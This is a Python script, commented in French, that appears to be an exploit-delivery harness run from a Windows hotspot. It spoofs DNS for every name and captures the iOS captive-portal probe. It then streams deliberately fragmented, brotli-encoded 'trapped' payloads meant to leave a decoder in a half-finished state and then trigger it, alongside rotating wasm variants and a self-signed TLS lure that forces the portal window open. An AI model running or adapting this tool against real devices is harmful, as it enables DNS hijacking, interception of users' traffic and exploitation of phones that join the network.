#!/usr/bin/env python3
"""
Portail captif pour CNA (Captive Network Assistant) -- phases 1 et 2.

- DNS UDP/53 : repond A -> IP du hotspot pour TOUS les noms (wildcard), AAAA vide
- HTTP TCP/80 : catch-all, journalise tout en JSONL, sert ./pages

Modes:
  python serve.py                 # portail normal
  python serve.py --br            # sert pages/<x>.html.br si present (Content-Encoding: br)
  python serve.py --payload f.br  # repond le corps brut a toutes les requetes

Doit tourner EN ADMINISTRATEUR (ports 53/80).
"""

import argparse
import json
import os
import socket
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
PAGES = os.path.join(HERE, "pages")
LOG = os.path.join(HERE, "hits.jsonl")

ARGS = None
COMPTEUR = 0
SPOOF_ONLY = set()
FALLBACK = b"<html><body><h1>portal</h1></body></html>"


# --------------------------------------------------------------------------- DNS
def dns_server(ip, bind_ip="0.0.0.0", upstream=None, spoof_all=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind_ip, 53))
    except OSError as e:
        print(f"[dns] ECHEC bind {bind_ip}:53 -> {e}")
        # le partage de connexion de Windows (ICS) choure le port 53 en 0.0.0.0
        # et en exclusif. on arrive quand meme a binder sur .1 et .2, mais c'est
        # la loterie selon l'ordre de demarrage. d'ou les deux conseils ci-dessous.
        print("[dns] Le proxy DNS d'ICS squatte peut-etre le port. Deux sorties :")
        print("[dns]   1) relancer avec  --dns-bind <ip>  (l'IP exacte du hotspot)")
        print("[dns]   2) couper ICS et utiliser hostapd sous WSL (voir README)")
        print("[dns] Sans DNS spoofe: pas de portail captif, le device sortira sur Internet.")
        return
    print("[dns] ecoute %s:53 (wildcard -> %s, relais -> %s)" % (bind_ip, ip, upstream))
    answer = socket.inet_aton(ip)
    relay = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    relay.settimeout(3.0)

    while True:
        try:
            data, addr = s.recvfrom(1500)
        except OSError:
            # Windows remonte l'ICMP "port unreachable" en ConnectionResetError:
            # sans ce garde-fou le thread DNS meurt et le spoof s'arrete en silence
            continue
        if len(data) < 17:
            continue

        # extraction du nom AVANT de decider spoof/relais
        tid = data[:2]
        i, labels = 12, []
        while i < len(data) and data[i]:
            n = data[i]
            labels.append(data[i + 1:i + 1 + n].decode("latin-1"))
            i += n + 1
        if i + 4 >= len(data):
            continue
        qtype = struct.unpack(">H", data[i + 1:i + 3])[0]
        qname = ".".join(labels)

        # l'hote lui-meme garde un vrai DNS; les clients du hotspot sont spoofes
        if spoof_all:
            spoof = True
        elif SPOOF_ONLY:
            spoof = qname in SPOOF_ONLY
        else:
            spoof = upstream is None or (addr[0].startswith("192.168.137.") and addr[0] != ip)
        log({"dns_rx": "*", "src": addr[0], "spoof": spoof, "q": qname})
        if not spoof:
            try:
                relay.sendto(data, (upstream, 53))
                s.sendto(relay.recvfrom(1500)[0], addr)
            except OSError:
                pass
            continue

        question = data[12:i + 5]
        if qtype == 1:                      # A
            hdr = tid + b"\x81\x80" + b"\x00\x01\x00\x01" + b"\x00\x00\x00\x00"
            rr = b"\xc0\x0c" + b"\x00\x01\x00\x01" + struct.pack(">I", 1) + b"\x00\x04" + answer
            resp = hdr + question + rr
        else:                               # AAAA et autres -> aucune reponse
            hdr = tid + b"\x81\x80" + b"\x00\x01\x00\x00" + b"\x00\x00\x00\x00"
            resp = hdr + question
        try:
            s.sendto(resp, addr)
            res = "ok"
        except OSError as e:
            res = repr(e)
        log({"dns": qname, "type": qtype, "from": addr[0], "res": res})


# -------------------------------------------------------------------------- HTTP
def log(rec):
    rec["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S")
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    if "dns" in rec:
        print(f"[dns ] {rec['from']} {rec['dns']} type={rec['type']}", flush=True)
    elif "dns_rx" in rec:
        print(f"[raw ] paquet de {rec['src']} spoof={rec['spoof']}", flush=True)
    elif "note" in rec:
        print(f"[http] {rec['from']} {rec['note']} first={rec.get('first')} second={rec.get('second')}", flush=True)
    else:
        print(f"[http] {rec['from']} {rec.get('method', '-')} {rec.get('host', '-')}{rec.get('path', '-')} "
              f"ua={rec.get('ua', '')[:40]}")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _body(self):
        path = self.path.split("?")[0]
        ct = "text/html; charset=utf-8"
        if path.endswith(".wasm"):
            ct = "application/wasm"
        if path.endswith(".txt"):
            ct = "text/plain; charset=utf-8"

        if ARGS.payload:
            with open(ARGS.payload, "rb") as fh:
                return fh.read(), ARGS.ct, True

        if ARGS.br:
            cand = os.path.join(PAGES, path.lstrip("/") + ".br")
            if os.path.isfile(cand):
                with open(cand, "rb") as fh:
                    return fh.read(), ct, True

        # fichier .br demande explicitement -> servi compresse
        if path.endswith(".br"):
            cand = os.path.normpath(os.path.join(PAGES, path.lstrip("/")))
            if cand.startswith(PAGES) and os.path.isfile(cand):
                with open(cand, "rb") as fh:
                    return fh.read(), "text/plain; charset=utf-8", True

        cand = os.path.normpath(os.path.join(PAGES, path.lstrip("/")))
        if cand.startswith(PAGES) and os.path.isfile(cand):
            with open(cand, "rb") as fh:
                return fh.read(), ct, False

        for name in ("index.html", "portal.html"):
            p = os.path.join(PAGES, name)
            if os.path.isfile(p):
                with open(p, "rb") as fh:
                    return fh.read(), ct, False
        return FALLBACK, ct, False

    def _chunked(self, chemin1=None, chemin2=None, mode=None):
        # on triche sur le transport: deux ecritures separees pour que le decodeur
        # soit appele deux fois (stage 1 parke l'etat, stage 2 declenche). en un seul
        # bloc ca ne fait rien du tout.
        first = open(chemin1 or ARGS.chunked_first, "rb").read()
        second = open(chemin2 or ARGS.chunked_second, "rb").read()
        mode = mode or ARGS.chunked_mode

        if mode == "cl":
            # Content-Length au lieu de chunked. contre-intuitif, mais c'est le seul
            # transport qui fait aller un corps de 23 Mo au bout au lieu de le couper.
            total = len(first) - 1 + len(second)
            log({"note": "chunked", "mode": mode, "first": len(first), "second": len(second),
                 "from": self.client_address[0]})
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Encoding", "br")
            self.send_header("Content-Length", str(total))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(first[:-1])
            self.wfile.flush()
            time.sleep(ARGS.chunked_delay / 1000.0)
            self.wfile.write(second)
            self.wfile.flush()
            return

        log({"note": "chunked", "mode": mode, "first": len(first), "second": len(second),
             "from": self.client_address[0]})
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Encoding", "br")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

        def w(bloc):
            self.wfile.write(b"%x\r\n" % len(bloc) + bloc + b"\r\n")
            self.wfile.flush()

        if mode == "oobfast":
            # variante rapide : grosses tranches, aucun delai, flush a chaque envoi
            pas = 262144
            for k in range(0, len(first), pas):
                w(first[k:k + pas])
            self.wfile.flush()
            for o in second:
                w(bytes([o]))
            self.wfile.write(b"0\r\n\r\n")
            self.wfile.flush()
            return

        if mode == "oob":
            # stage 1 par tranches de 64 Kio, chaque tranche flushee (comme le harness)
            pas = 65536
            for k in range(0, len(first), pas):
                w(first[k:k + pas])
                time.sleep(0.001)
            self.wfile.flush()
            time.sleep(ARGS.chunked_delay / 1000.0)
            # stage 2 fragmente octet par octet
            for o in second:
                w(bytes([o]))
                time.sleep(0.008)
            self.wfile.write(b"0\r\n\r\n")
            self.wfile.flush()
            return

        # "tail" : garde 2 octets de la fin pour les envoyer separement
        garde = 2 if mode == "tail" else 1
        corps = first[:-garde]
        queue = first[-garde:]

        # chunk 1 : parke l'etat (tout sauf la queue)
        w(corps)
        self.wfile.flush()
        time.sleep(ARGS.chunked_delay / 1000.0)

        if mode == "tail":
            for o in queue:
                w(bytes([o]))
                time.sleep(0.01)
            time.sleep(ARGS.chunked_delay / 1000.0)

        if mode == "bytewise" or mode == "tail":
            # declencheur octet par octet : reproduit les appels courts du harness
            for o in second:
                w(bytes([o]))
                time.sleep(0.008)
        else:
            w(second)

        self.wfile.write(b"0\r\n\r\n")
        self.wfile.flush()

    def _serve(self, with_body):
        # en mode proxy, la requete arrive en URL absolue: on garde le chemin seul
        if "://" in self.path:
            reste = self.path.split("://", 1)[1]
            self.path = "/" + reste.split("/", 1)[1] if "/" in reste else "/"
        host = self.headers.get("Host", "")
        log({"method": self.command, "host": host, "path": self.path,
             "ua": self.headers.get("User-Agent", ""), "from": self.client_address[0]})

        # variante de module wasm servie a la suite, une par chargement
        if self.path.split("?")[0] == "/eh.wasm":
            global COMPTEUR
            n = 1
            COMPTEUR += 1
            fichier = os.path.join(PAGES, f"eh_{n}.wasm")
            if not os.path.isfile(fichier):
                fichier = os.path.join(PAGES, "eh_0.wasm")
            with open(fichier, "rb") as fh:
                donnees = fh.read()
            log({"note": "variante", "n": n, "from": self.client_address[0]})
            self.send_response(200)
            self.send_header("Content-Type", "application/wasm")
            self.send_header("Content-Length", str(len(donnees)))
            self.send_header("X-Variante", str(n))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(donnees)
            return
            self.send_response(204)
            self.send_header("Content-Length", "0")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return

        # la sonde captive -> flux brotli piege directement (sans WebView)
        if ARGS.probe_br and self.path.split("?")[0].startswith("/hotspot-detect.html"):
            self._chunked()
            return

        # la sonde captive -> redirection explicite vers le portail
        if ARGS.portal and self.path.split("?")[0].startswith("/hotspot-detect.html"):
            # 511 "network authentication required" c'est le code prevu pour ce cas.
            # iOS ne le suit pas, il ne suit que le 302. garde quand meme,
            # quelqu'un en aura besoin un jour (ou pas).
            log({"note": "sonde-redirect", "code": ARGS.probe_code, "from": self.client_address[0]})
            self.send_response(ARGS.probe_code)
            self.send_header("Location", ARGS.portal)
            self.send_header("Content-Length", "0")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            return

        if ARGS.chunked_first and self.path.split("?")[0].startswith("/c.br"):
            base = self.path.split("?")[0]
            query = self.path.partition("?")[2]
            params = dict(kv.split("=", 1) for kv in query.split("&") if "=" in kv)
            sz, var = params.get("sz"), params.get("var")
            p1 = p2 = None
            if sz:
                p1 = os.path.join(HERE, "..", "payloads", f"p_{sz}.bin")
                if not os.path.isfile(p1):
                    p1 = None
            if var:
                p2 = os.path.join(HERE, "..", "payloads", f"s_{var}.bin")
                if not os.path.isfile(p2):
                    p2 = None
            self._chunked(p1, p2, params.get("mode"))
            return

        body, ct, br = self._body()
        self.send_response(200)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if br:
            self.send_header("Content-Encoding", "br")
        self.end_headers()
        if with_body:
            self.wfile.write(body)

    def do_GET(self):
        self._serve(True)

    def do_HEAD(self):
        self._serve(False)

    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
            if n:
                self.rfile.read(n)
        except Exception:
            pass
        self._serve(True)


def hotspot_ip():
    """Cherche l'IP du partage de connexion (ICS = 192.168.137.1)."""
    try:
        out = os.popen('powershell -NoProfile -Command '
                       '"(Get-NetIPAddress -AddressFamily IPv4 | '
                       "Where-Object {$_.IPAddress -like '192.168.137.*'} | "
                       'Select-Object -First 1).IPAddress"').read().strip()
        if out:
            return out
    except Exception:
        pass
    return "192.168.137.1"


def upstream_dns():
    """DNS reel du Wi-Fi (pour ne pas couper Internet a l'hote)."""
    try:
        out = os.popen('powershell -NoProfile -Command '
                       '"(Get-DnsClientServerAddress -InterfaceAlias \'Wi-Fi\' '
                       '-AddressFamily IPv4).ServerAddresses | Select-Object -First 1"').read().strip()
        if out:
            return out
    except Exception:
        pass
    return None


def main():
    global ARGS, SPOOF_ONLY
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default=None)
    ap.add_argument("--dns-bind", default="0.0.0.0")
    ap.add_argument("--upstream", default=None)
    ap.add_argument("--spoof-all", action="store_true")
    ap.add_argument("--portal", default=None,
                    help="chemin vers lequel rediriger (302) la sonde captive")
    ap.add_argument("--probe-br", action="store_true",
                    help="repond a la sonde avec le flux brotli au lieu du portail")
    ap.add_argument("--probe-code", type=int, default=302)
    ap.add_argument("--spoof-only", default=None,
                    help="liste de noms a spoof, le reste part en relais")
    ap.add_argument("--chunked-first", default=None)
    ap.add_argument("--chunked-second", default=None)
    ap.add_argument("--chunked-delay", type=int, default=250)
    ap.add_argument("--chunked-mode", default="split",
                    choices=["split", "bytewise", "tail", "oob", "oobfast"])
    ap.add_argument("--br", action="store_true")
    ap.add_argument("--payload", default=None)
    ap.add_argument("--ct", default="text/html; charset=utf-8")
    ARGS = ap.parse_args()
    if ARGS.spoof_only:
        SPOOF_ONLY = {x.strip() for x in ARGS.spoof_only.split(",") if x.strip()}

    os.makedirs(PAGES, exist_ok=True)
    ip = ARGS.ip or hotspot_ip()
    up = ARGS.upstream or upstream_dns()
    print(f"[cfg] ip annoncee: {ip}  br={ARGS.br}  payload={ARGS.payload}  upstream={up}")

    for adresse in [x.strip() for x in ARGS.dns_bind.split(",") if x.strip()]:
        threading.Thread(target=dns_server, args=(ip, adresse, up, ARGS.spoof_all),
                         daemon=True).start()

    # HTTPS auto-signe sur 443 : l'erreur de certificat force le CNA a s'ouvrir
    try:
        import ssl

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(os.path.join(HERE, "cert.pem"), os.path.join(HERE, "key.pem"))
        tls = ThreadingHTTPServer(("0.0.0.0", 443), Handler)
        tls.socket = ctx.wrap_socket(tls.socket, server_side=True)
        threading.Thread(target=tls.serve_forever, daemon=True).start()
        print("[tls ] ecoute 0.0.0.0:443 (cert auto-signe)")
    except Exception as e:
        print(f"[tls ] 443 indisponible: {e}")

    httpd = ThreadingHTTPServer(("0.0.0.0", 80), Handler)
    print("[http] ecoute 0.0.0.0:80")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[bye]")


if __name__ == "__main__":
    main()

